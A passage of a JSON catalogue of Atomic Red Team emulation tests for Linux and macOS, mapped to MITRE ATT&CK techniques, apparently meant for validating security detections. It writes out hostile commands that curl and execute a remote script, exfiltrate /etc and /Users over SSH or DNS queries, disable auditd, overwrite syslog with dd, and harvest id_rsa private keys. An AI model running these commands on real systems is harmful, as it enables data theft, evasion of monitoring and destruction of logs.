    "original_description": "Utilize sftp to perform a remote file copy (pull)\n",
    "indexed_technique": "T1105.06",
    "technique_index": 6,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1105",
    "display_name": "Ingress Tool Transfer",
    "source_file": "T1105.yaml",
    "test_name": "whois file download",
    "test_guid": "c99a829f-0bb8-4187-b2c6-d47d1df74cab",
    "description": "This test downloads a file using whois to localhost:8443 with query 'Hello from Atomic Red Team test T1105', saving output to /tmp/T1105.whois.out with a 1-second timeout.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} \"#{query}\" > #{output_file}\n",
      "cleanup_command": "rm -f #{output_file}\n"
    },
    "input_arguments": {
      "remote_host": {
        "description": "Remote hostname or IP address",
        "type": "string",
        "default": "localhost"
      },
      "remote_port": {
        "description": "Remote port to connect to",
        "type": "integer",
        "default": 8443
      },
      "output_file": {
        "description": "Path of file to save output to",
        "type": "path",
        "default": "/tmp/T1105.whois.out"
      },
      "query": {
        "description": "Query to send to remote server",
        "type": "string",
        "default": "Hello from Atomic Red Team test T1105"
      },
      "timeout": {
        "description": "Timeout period before ending process (seconds)",
        "type": "integer",
        "default": 1
      }
    },
    "dependencies": [
      {
        "description": "The whois and timeout commands must be present\n",
        "prereq_command": "which whois && which timeout\n",
        "get_prereq_command": "echo \"Please install timeout and the whois package\"\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Download a remote file using the whois utility\n",
    "indexed_technique": "T1105.07",
    "technique_index": 7,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1105",
    "display_name": "Ingress Tool Transfer",
    "source_file": "T1105.yaml",
    "test_name": "Linux Download File and Run",
    "test_guid": "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3",
    "description": "Utilize linux Curl to download a remote file (https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh), chmod +x it and run it.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}\n",
      "cleanup_command": "rm #{payload_name}\n",
      "name": "sh"
    },
    "input_arguments": {
      "remote_url": {
        "description": "url of remote payload",
        "type": "string",
        "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh"
      },
      "payload_name": {
        "description": "payload name",
        "type": "string",
        "default": "atomic.sh"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Utilize linux Curl to download a remote file, chmod +x it and run it.\n",
    "indexed_technique": "T1105.08",
    "technique_index": 8,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1036.005",
    "display_name": "Masquerading: Match Legitimate Name or Location",
    "source_file": "T1036.005.yaml",
    "test_name": "Execute a process from a directory masquerading as the current parent directory.",
    "test_guid": "812c3ab8-94b0-4698-a9bf-9420af23ce24",
    "description": "This test creates a directory named '...' in $HOME, copies the 'sh' binary to it, and executes it to echo 'Hello from the Atomic Red Team test T1036.005#1'. ",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "mkdir $HOME/...\ncp $(which sh) $HOME/...\n$HOME/.../sh -c \"echo #{test_message}\"\n",
      "cleanup_command": "rm -f $HOME/.../sh\nrmdir $HOME/.../\n"
    },
    "input_arguments": {
      "test_message": {
        "description": "Test message to echo out to the screen",
        "type": "string",
        "default": "Hello from the Atomic Red Team test T1036.005#1"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)\n",
    "indexed_technique": "T1036.005.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.012",
    "display_name": "Impair Defenses: Disable or Modify Linux Audit System",
    "source_file": "T1562.012.yaml",
    "test_name": "Delete all auditd rules using auditctl",
    "test_guid": "33a29ab1-cabb-407f-9448-269041bf2856",
    "description": "Using 'auditctl -D' deletes all existing audit rules.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "auditctl -D\n",
      "name": "sh",
      "elevation_required": true,
      "cleanup_command": "service auditd restart\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if auditd is installed.\n",
        "prereq_command": "if [ $(command -v auditctl) ]; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "(yum install auditd -y) || (apt-get install auditd -y) || (dnf install auditd -y)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Using 'auditctl -D' deletes all existing audit rules, resulting in the loss of previously configured monitoring settings and the audit trail. This action reduces visibility into system activities, potentially leading to compliance concerns and hampering security monitoring efforts. Additionally, it poses a risk of covering unauthorized activities by erasing evidence from audit logs.\n",
    "indexed_technique": "T1562.012.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.012",
    "display_name": "Impair Defenses: Disable or Modify Linux Audit System",
    "source_file": "T1562.012.yaml",
    "test_name": "Disable auditd using auditctl",
    "test_guid": "7906f0a6-b527-46ee-9026-6e81a9184e08",
    "description": "Disables the Linux audit system using the `auditctl -e 0` command.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "auditctl -e 0\n",
      "name": "sh",
      "elevation_required": true,
      "cleanup_command": "auditctl -e 1\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if auditd is installed.\n",
        "prereq_command": "if [ $(command -v auditctl) ]; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "(yum install auditd -y) || (apt-get install auditd -y) || (dnf install auditd -y)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "The command `auditctl -e 0` disables the audit system. By setting the parameter to `0`, auditing is deactivated, halting the monitoring and recording of security-related events. This action stops the generation of audit logs, ceasing the collection of data regarding system activities. Disabling auditing may be done for various reasons, such as troubleshooting, performance optimization, or temporarily suspending auditing requirements, but it reduces visibility into system events and can impact security monitoring and compliance efforts.\n",
    "indexed_technique": "T1562.012.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1048",
    "display_name": "Exfiltration Over Alternative Protocol",
    "source_file": "T1048.yaml",
    "test_name": "Exfiltration Over Alternative Protocol - SSH",
    "test_guid": "f6786cc8-beda-4915-a4d6-ac2f193bb988",
    "description": "This test uses SSH to connect to target.example.com, compresses the /etc directory into a tar.gz file, and saves it locally as ./etc.tar.gz.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n",
      "name": "sh"
    },
    "input_arguments": {
      "domain": {
        "description": "target SSH domain",
        "type": "url",
        "default": "target.example.com"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n",
    "indexed_technique": "T1048.01",
    "technique_index": 1,
    "categories": [
      "exfiltration"
    ]
  },
  {
    "attack_technique": "T1048",
    "display_name": "Exfiltration Over Alternative Protocol",
    "source_file": "T1048.yaml",
    "test_name": "Exfiltration Over Alternative Protocol - SSH",
    "test_guid": "7c3cb337-35ae-4d06-bf03-3032ed2ec268",
    "description": "Compresses the local /Users/* directory, encrypts the archive with the password 'atomic', and transfers it via SSH to be saved as /Users.tar.gz.enc on the remote host target.example.com.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n",
      "name": "sh"
    },
    "input_arguments": {
      "user_name": {
        "description": "username for domain",
        "type": "string",
        "default": "atomic"
      },
      "password": {
        "description": "password for user",
        "type": "string",
        "default": "atomic"
      },
      "domain": {
        "description": "target SSH domain",
        "type": "url",
        "default": "target.example.com"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n",
    "indexed_technique": "T1048.02",
    "technique_index": 2,
    "categories": [
      "exfiltration"
    ]
  },
  {
    "attack_technique": "T1048",
    "display_name": "Exfiltration Over Alternative Protocol",
    "source_file": "T1048.yaml",
    "test_name": "Exfiltrate Data using DNS Queries via dig",
    "test_guid": "a27916da-05f2-4316-a3ee-feec67a437be",
    "description": "Uses 'dig' to send a DNS query for the base64-encoded text \"this is a secret info\" to the DNS server at 8.8.8.8 on port 53.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "dig @#{attacker_dns_server} -p #{dns_port} $(echo \"#{secret_info}\" | base64).google.com\n",
      "name": "bash",
      "elevation_required": false
    },
    "input_arguments": {
      "dns_port": {
        "type": "integer",
        "default": "53",
        "description": "Attacker's DNS server port"
      },
      "attacker_dns_server": {
        "type": "string",
        "default": "8.8.8.8",
        "description": "Attacker's DNS server address"
      },
      "secret_info": {
        "type": "string",
        "default": "this is a secret info",
        "description": "secret info that will be exfiltirated"
      }
    },
    "dependencies": [
      {
        "description": "dig command",
        "prereq_command": "which dig",
        "get_prereq_command": "which apt && sudo apt update && sudo apt install -y bind9-dnsutils || which yum && sudo yum install -y bind-utils || which dnf && sudo dnf install -y bind-utils || which apk && sudo apk add bind-tools || which pkg && sudo pkg update && sudo pkg install -y bind-tools || which brew && brew update && brew install --quiet bind\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and \nmaking DNS queries via the dig command to a controlled DNS server.\n",
    "indexed_technique": "T1048.03",
    "technique_index": 3,
    "categories": [
      "exfiltration"
    ]
  },
  {
    "attack_technique": "T1546.005",
    "display_name": "Event Triggered Execution: Trap",
    "source_file": "T1546.005.yaml",
    "test_name": "Trap EXIT",
    "test_guid": "a74b2e07-5952-4c03-8b56-56274b076b61",
    "description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'\n",
      "cleanup_command": "rm -f /tmp/art-fish.txt\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
    "indexed_technique": "T1546.005.01",
    "technique_index": 1,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1546.005",
    "display_name": "Event Triggered Execution: Trap",
    "source_file": "T1546.005.yaml",
    "test_name": "Trap SIGINT",
    "test_guid": "a547d1ba-1d7a-4cc5-a9cb-8d65e8809636",
    "description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'\n",
      "cleanup_command": "rm -f /tmp/art-fish.txt\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
    "indexed_technique": "T1546.005.02",
    "technique_index": 2,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1083",
    "display_name": "File and Directory Discovery",
    "source_file": "T1083.yaml",
    "test_name": "Nix File and Directory Discovery",
    "test_guid": "ffc8b249-372a-4b74-adcd-e4c0430842de",
    "description": "Executes a series of discovery commands, including ls, find, locate, and which, to find files and directories, saving some results to /tmp/T1083.txt.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "ls -a >> #{output_file}\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;\nfile */* *>> #{output_file}\ncat #{output_file} 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n",
      "cleanup_command": "rm #{output_file}\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Output file used to store the results.",
        "type": "path",
        "default": "/tmp/T1083.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n",
    "indexed_technique": "T1083.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1083",
    "display_name": "File and Directory Discovery",
    "source_file": "T1083.yaml",
    "test_name": "Nix File and Directory Discovery 2",
    "test_guid": "13c5e1ae-605b-46c4-a79f-db28c77ff24e",
    "description": "Uses `find` to discover and list files and directories in the user's home directory, including a search for PDF and hidden files, saving the results to /tmp/T1083.txt.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}\nif [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;\nfind . -type f -iname *.pdf >> #{output_file}\ncat #{output_file}\nfind . -type f -name \".*\"\n",
      "cleanup_command": "rm #{output_file}",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Output file used to store the results.",
        "type": "path",
        "default": "/tmp/T1083.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Find or discover files on the file system\n",
    "indexed_technique": "T1083.02",
    "technique_index": 2,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1046",
    "display_name": "Network Service Discovery",
    "source_file": "T1046.yaml",
    "test_name": "Port Scan",
    "test_guid": "68e907da-2539-48f6-9fc9-257a78c05540",
    "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done\n",
      "name": "bash"
    },
    "input_arguments": {
      "host": {
        "description": "Host to scan.",
        "type": "string",
        "default": "192.168.1.1"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n",
    "indexed_technique": "T1046.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1046",
    "display_name": "Network Service Discovery",
    "source_file": "T1046.yaml",
    "test_name": "Port Scan Nmap",
    "test_guid": "515942b0-a09f-4163-a7bb-22fefb6f185f",
    "description": "This test uses nmap, telnet, and nc to scan port 80 on 192.168.1.1 and the 192.168.1.0/24 network range for listening ports, displaying results via stdout.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "sudo nmap -sS #{network_range} -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "host": {
        "description": "Host to scan.",
        "type": "string",
        "default": "192.168.1.1"
      },
      "port": {
        "description": "Ports to scan.",
        "type": "string",
        "default": "80"
      },
      "network_range": {
        "description": "Network Range to Scan.",
        "type": "string",
        "default": "192.168.1.0/24"
      }
    },
    "dependencies": [
      {
        "description": "Check if nmap command exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v nmap)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "(which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)||(which pkg && pkg install -y nmap)\n"
      },
      {
        "description": "Check if nc command exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v nc)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "(which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)||(which pkg && pkg install -y netcat)\n"
      },
      {
        "description": "Check if telnet command exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v telnet)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "(which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Scan ports to check for listening ports with Nmap.\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.\n",
    "indexed_technique": "T1046.02",
    "technique_index": 2,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1046",
    "display_name": "Network Service Discovery",
    "source_file": "T1046.yaml",
    "test_name": "Port Scan using nmap (Port range)",
    "test_guid": "0d5a2b03-3a26-45e4-96ae-89485b4d1f97",
    "description": "Uses nmap to scan all ports on 127.0.0.1, saving results to /tmp/T1046.nmap.out.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "nmap -Pn -sV -p #{port_range} #{host}\n",
      "elevation_required": true,
      "name": "sh"
    },
    "input_arguments": {
      "host": {
        "description": "Host(s) to scan.",
        "type": "string",
        "default": "127.0.0.1"
      },
      "port_range": {
        "description": "Port range(s) to scan.",
        "type": "string",
        "default": "0-65535"
      }
    },
    "dependencies": [
      {
        "description": "Check if nmap command exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v nmap)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "(which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)||(which pkg && pkg install -y nmap)||(which brew && brew install nmap)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Scan multiple ports to check for listening ports with nmap\n",
    "indexed_technique": "T1046.03",
    "technique_index": 3,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1074.001",
    "display_name": "Data Staged: Local Data Staging",
    "source_file": "T1074.001.yaml",
    "test_name": "Stage data from Discovery.sh",
    "test_guid": "39ce0303-ae16-4b9e-bb5b-4f53e8262066",
    "description": "Utilize curl to download discovery.sh (https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh) and execute a basic information gathering shell script\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}\n",
      "cleanup_command": "rm #{output_file}\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "Location to save downloaded discovery.bat file",
        "type": "path",
        "default": "/tmp/T1074.001_discovery.log"
      }
    },
    "dependencies": [
      {
        "description": "Check if curl is installed on the machine.\n",
        "prereq_command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
        "get_prereq_command": "which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n",
    "indexed_technique": "T1074.001.01",
    "technique_index": 1,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1485",
    "display_name": "Data Destruction",
    "source_file": "T1485.yaml",
    "test_name": "FreeBSD/macOS/Linux - Overwrite file with DD",
    "test_guid": "38deee99-fd65-4031-bec8-bfa4f9f26146",
    "description": "This test uses dd to overwrite /var/log/syslog with data from /dev/zero, matching the file's size.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes\n",
      "name": "sh"
    },
    "input_arguments": {
      "overwrite_source": {
        "description": "Path of data source to overwrite with",
        "type": "path",
        "default": "/dev/zero"
      },
      "file_to_overwrite": {
        "description": "Path of file to overwrite and remove",
        "type": "path",
        "default": "/var/log/syslog"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Overwrites and deletes a file using DD.\nTo stop the test, break the command with CTRL/CMD+C.\n",
    "indexed_technique": "T1485.01",
    "technique_index": 1,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1040",
    "display_name": "Network Sniffing",
    "source_file": "T1040.yaml",
    "test_name": "Packet Capture Linux using tshark or tcpdump",
    "test_guid": "7fe741f7-b265-4951-a7c7-320889083b3e",
    "description": "This test uses tcpdump or tshark to capture 5 packets on the ens33 interface.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "interface": {
        "description": "Specify interface to perform PCAP on.",
        "type": "string",
        "default": "ens33"
      }
    },
    "dependencies": [
      {
        "description": "Check if at least one of tcpdump or tshark is installed.\n",
        "prereq_command": "if [ ! -x \"$(command -v tcpdump)\" ] && [ ! -x \"$(command -v tshark)\" ]; then exit 1; else exit 0; fi;\n",
        "get_prereq_command": "(which yum && yum -y install epel-release tcpdump tshark)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n",
    "indexed_technique": "T1040.01",
    "technique_index": 1,
    "categories": [
      "credential-access",
      "discovery"
    ]
  },
  {
    "attack_technique": "T1040",
    "display_name": "Network Sniffing",
    "source_file": "T1040.yaml",
    "test_name": "Packet Capture FreeBSD using /dev/bpfN with sudo",
    "test_guid": "e2028771-1bfb-48f5-b5e6-e50ee0942a14",
    "description": "Runs the custom program /tmp/t1040_freebsd_pcapdemo.c with sudo to capture network traffic from the em0 interface for 3 seconds.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo #{program_path} -i #{ifname} -t 3\n",
      "cleanup_command": "rm -f #{program_path}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "ifname": {
        "description": "Specify interface to perform PCAP on.",
        "type": "string",
        "default": "em0"
      },
      "csource_path": {
        "description": "Path to C program source",
        "type": "string",
        "default": "PathToAtomicsFolder/T1040/src/freebsd_pcapdemo.c"
      },
      "program_path": {
        "description": "Path to compiled C program",
        "type": "string",
        "default": "/tmp/t1040_freebsd_pcapdemo"
      }
    },
    "dependencies": [
      {
        "description": "compile C program\n",
        "prereq_command": "exit 1\n",
        "get_prereq_command": "cc #{csource_path} -o #{program_path}\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n",
    "indexed_technique": "T1040.02",
    "technique_index": 2,
    "categories": [
      "credential-access",
      "discovery"
    ]
  },
  {
    "attack_technique": "T1040",
    "display_name": "Network Sniffing",
    "source_file": "T1040.yaml",
    "test_name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo",
    "test_guid": "10c710c9-9104-4d5f-8829-5b65391e2a29",
    "description": "Executes the custom program /tmp/t1040_linux_pcapdemo with sudo to capture network packets for 3 seconds.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo #{program_path} -a -t 3\n",
      "cleanup_command": "rm -f #{program_path}\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "csource_path": {
        "description": "Path to C program source",
        "type": "string",
        "default": "PathToAtomicsFolder/T1040/src/linux_pcapdemo.c"
      },
      "program_path": {
        "description": "Path to compiled C program",
        "type": "string",
        "default": "/tmp/t1040_linux_pcapdemo"
      }
    },
    "dependencies": [
      {
        "description": "compile C program\n",
        "prereq_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "cc #{csource_path} -o #{program_path}\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few seconds.\n",
    "indexed_technique": "T1040.03",
    "technique_index": 3,
    "categories": [
      "credential-access",
      "discovery"
    ]
  },
  {
    "attack_technique": "T1040",
    "display_name": "Network Sniffing",
    "source_file": "T1040.yaml",
    "test_name": "Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo",
    "test_guid": "515575ab-d213-42b1-aa64-ef6a2dd4641b",
    "description": "Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds (sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3).",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo #{program_path} -4 -P -p 17 -t 3\n",
      "cleanup_command": "rm -f #{program_path}\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "csource_path": {
        "description": "Path to C program source",
        "type": "string",
        "default": "PathToAtomicsFolder/T1040/src/linux_pcapdemo.c"
      },
      "program_path": {
        "description": "Path to compiled C program",
        "type": "string",
        "default": "/tmp/t1040_linux_pcapdemo"
      }
    },
    "dependencies": [
      {
        "description": "compile C program\n",
        "prereq_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "cc #{csource_path} -o #{program_path}\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.\nSOCK_PACKET is \"obsolete\" according to the man page, but still works on Ubuntu 20.04\n",
    "indexed_technique": "T1040.04",
    "technique_index": 4,
    "categories": [
      "credential-access",
      "discovery"
    ]
  },
  {
    "attack_technique": "T1552.004",
    "display_name": "Unsecured Credentials: Private Keys",
    "source_file": "T1552.004.yaml",
    "test_name": "Discover Private SSH Keys",
    "test_guid": "46959285-906d-40fa-9437-5a439accd878",
    "description": "Uses 'find' to search for private SSH keys (id_rsa) in the system's root directory, saving the results to /tmp/keyfile_locations.txt.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}\nexit 0\n",
      "cleanup_command": "rm #{output_file}\n",
      "name": "sh"
    },
    "input_arguments": {
      "search_path": {
        "description": "Path where to start searching from.",
        "type": "path",
        "default": "/"
      },
      "output_file": {
        "description": "Output file containing locations of SSH key files",
        "type": "path",
        "default": "/tmp/keyfile_locations.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Discover private SSH keys on a FreeBSD, macOS or Linux system.\n",
    "indexed_technique": "T1552.004.01",
    "technique_index": 1,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1552.004",
    "display_name": "Unsecured Credentials: Private Keys",
    "source_file": "T1552.004.yaml",
    "test_name": "Copy Private SSH Keys with CP",
    "test_guid": "7c247dc7-5128-4643-907b-73a76d9135c3",
    "description": "Creates a staging folder /tmp/art-staging and copies private SSH keys (id_rsa) from the root directory to it using the `cp` command.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \\;\nexit 0\n",
      "cleanup_command": "rm -rf #{output_folder}\n",
      "name": "sh"
    },
    "input_arguments": {
      "search_path": {
        "description": "Path where to start searching from.",
        "type": "path",
        "default": "/"
      },
      "output_folder": {
        "description": "Output folder containing copies of SSH private key files",
        "type": "path",
        "default": "/tmp/art-staging"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n",
    "indexed_technique": "T1552.004.02",
    "technique_index": 2,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1552.004",
    "display_name": "Unsecured Credentials: Private Keys",
    "source_file": "T1552.004.yaml",
    "test_name": "Copy Private SSH Keys with rsync",
    "test_guid": "864bb0b2-6bb5-489a-b43b-a77b3a16d68a",
    "description": "Creates a staging folder /tmp/art-staging and copies private SSH keys (id_rsa) from the root directory to it using the `rsync` command.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;\nexit 0\n",
      "cleanup_command": "rm -rf #{output_folder}\n",
      "name": "sh"
    },
    "input_arguments": {
      "search_path": {
        "description": "Path where to start searching from.",
        "type": "path",
        "default": "/"
      },
      "output_folder": {
        "description": "Output folder containing copies of SSH private key files",
        "type": "path",
        "default": "/tmp/art-staging"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n",
    "indexed_technique": "T1552.004.03",
    "technique_index": 3,
    "categories": [
      "credential-access"
    ]
  },
  {
